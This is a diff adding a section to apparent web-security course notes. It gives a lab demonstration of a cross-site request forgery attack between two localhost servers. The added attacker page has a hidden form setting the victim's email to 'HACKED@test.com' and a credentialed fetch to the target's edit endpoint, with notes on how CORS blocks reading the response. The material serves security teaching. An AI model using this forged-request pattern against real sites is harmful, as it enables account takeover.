@@ -970,3 +970,42 @@ We are going to use
             - This is going to automaticaly call form post 
             - It is going to generate a error: CSRF Token missing or expired because we are not sending any token.
 
+    - Second attack form (1.03.37)
+
+      - Create an apps/attack-server/src/index_03.html file
+
+        ```html
+          <!doctype html>
+          <html lang="en">
+            <head>
+              <meta charset="UTF-8" />
+              <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+              <title>Attacker WebSite</title>
+            </head>
+            <body>
+              <div>
+                <h1>Some nice website 2</h1>
+                <form name="form" action="http://localhost:3333/login/edit" method="post">
+                  <input type="hidden" name="email" value="HACKED@test.com" />
+                </form>
+              </div>
+              <script>
+                // document.form.submit();
+                fetch('http://localhost:3333/login/edit', { credentials: "include" })
+                  .then((res) => res.text())
+                  .then((html) => console.log(html))
+                  .catch((err) => console.log(err));
+              </script>
+            </body>
+          </html>
+        ```
+      - How this attack occurs
+          - targer-server
+            - Run targer-server: [targer-server](http://localhost:3333/home)
+            - Login into targer-server
+          - attack-server
+            - Run targer-server: [attack-server](http://localhost:5555)
+              - target-server is going to print in console a new token.
+              - attack-server is going to console a error.
+                - Access to fetch at **'http://localhost:3333/login/edit'** from origin **'http://localhost:5555'** has been blocked by **CORS policy**
+                - (1.05.56) Se descarga un código del atacante, pero este código tiene peticiones que hace a otro servidor, la petición es procesada (no hay ningún problema) el navegador no te permite ver la respuesta por temas de seguridad, es decir para que se pueda ver la respuesta, el servidor **target** debe enviar en sus cabeceras un **Access-Control-Allow-Origin** permitiéndote explícitamente ver esa respuesta.
